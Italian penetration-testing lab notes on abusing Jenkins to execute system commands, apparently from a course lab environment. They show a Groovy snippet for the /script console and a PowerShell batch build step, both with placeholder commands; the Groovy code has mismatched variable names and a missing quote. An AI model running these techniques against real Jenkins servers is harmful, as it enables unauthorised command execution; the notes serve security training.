# Privilege Escalation-Feature Abuse-Jenkins

* Utilizzare una <kbd>vecchia versione di Jenkins</kbd> come <kbd>esempio di applicazione Enterprise vulnerabile</kbd>
* <kbd>Jenkins</kbd> e' uno strumento di <kbd>Continuos Integration (CI)</kbd> largamente usato
* Ci sono molti aspetti interessanti legati a Jenkins, ma per ora la discussione e' limitata alla <kbd>possibilita' di eseguire comandi di sistema tramite Jenkins</kbd>
* C'e' un <kbd>server Jenkins</kbd> in esecuzione nell'laboratorio su <kbd>dcorp-ci (172.16.3.11) sulla porta 8080</kbd>&#x20;
* &#x20;Oltre diversi plugin, ci sono due modi principali per eseguire comandi su server Jenkins Master
*   **Se si ha un accesso amministrativo** (comportamenteo da installazione di default nelle versioni precedenti 2.x) aprire l'url: `http://<jenkins_server>/script`

    Nella console script, script Groovy possono essere eseguiti

```groovy
def sout = new StringBuffer(), serr= new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout,serr)
proc.waitForOrKill(1000)
println "out> $out err> $err
```



* **Se non si hanno accessi amministrativi** ma si puo' <kbd>aggiungere o editare dei build steps nella build configuration.</kbd> Aggiungere un build step, aggiungere `"Execute Windwos Batch Command"` e inserire

```powershell
powershell -c <command>
```
